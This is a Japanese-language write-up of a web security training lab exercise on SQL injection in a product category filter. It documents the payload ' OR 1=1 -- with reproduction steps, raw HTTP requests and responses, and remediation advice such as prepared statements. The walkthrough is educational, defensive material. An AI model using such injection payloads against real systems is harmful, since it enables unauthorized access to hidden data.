# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

## 概要
このラボでは、SQL文のwhere句にユーザ入力が連結しており、サニタイズされていないためSQLインジェクションが起きた。
意図しない動き（商品の全表示）を実現した。

## 対象エンドポイント
”category=”が攻撃委ポイントとなっている。
”category=' OR 1=1 --”で実現。

## 脆弱性の原因
SQL文がURLに埋め込まれていた。
'や/などの文字に対してエスケープ処理がされていないため、”category='' OR 1=1 --'”となりSQL文が壊れてしまっている。

## リスク
この脆弱性を悪用すると、本来表示されるはずのない隠蔽された情報が表示されてしまう。

## 再現手順
https://0af600ae03202ec281c1c0ad00c000f8.web-security-academy.net/
 上記URLをユーザ入力ができる状態にする
https://0af600ae03202ec281c1c0ad00c000f8.web-security-academy.net/filter?category=
 上記URLは裏では
SELECT * FROM PRODUCTS WHERE category=''
 という状態で待機していると推測。
https://0af600ae03202ec281c1c0ad00c000f8.web-security-academy.net/filter?category='
 レスポンスが500．web上でinternal server errorとなったことを確認。
 
<details>
<summary>HTTPリクエスト/レスポンス</summary>
  
リクエスト
GET /filter?category=' HTTP/2
  
レスポンス
HTTP/2 500 Internal Server Error
<h4>Internal Server Error</h4>

</details>
  
https://0af600ae03202ec281c1c0ad00c000f8.web-security-academy.net/filter?category=' OR 1=1 --
 すべて表示されたこと確認。
 
<details>
<summary>HTTPリクエスト/レスポンス</summary>
  
リクエスト
GET /filter?category=' OR 1=1 -- HTTP/2
  
レスポンス
HTTP/2 200 OK
<h1>&apos; OR 1=1 --</h1>
</section> <section class="search-filters">

<div>
<h3>Babbage Web Spray</h3>
$67.06
</div>

<div>
<h3>Safety First</h3>
$36.12
</div>

などたくさんある

</details>
 
https://0af600ae03202ec281c1c0ad00c000f8.web-security-academy.net/filter?category=' OR 1=2 --
 SQL文は壊れず、すべて非表示になったことを確認。
<details>
<summary>HTTPリクエスト/レスポンス</summary>
  
リクエスト
GET /filter?category=' OR 1=2 -- HTTP/2
  
レスポンス
<h1>&apos; OR 1=2 --</h1>
<section class="container-list-tiles">
</section>
   
</details>


## 対策
プリペアドステートメントを使用し、ユーザ入力が文字連結しないようにする。
パラメータバインドを使用し、入力値をSQL文にを安全に渡す。
入力値のバリデーションを実施し、想定外の文字列（例：記号、制御文字、過度に長い文字列）を受け付けないようにする。


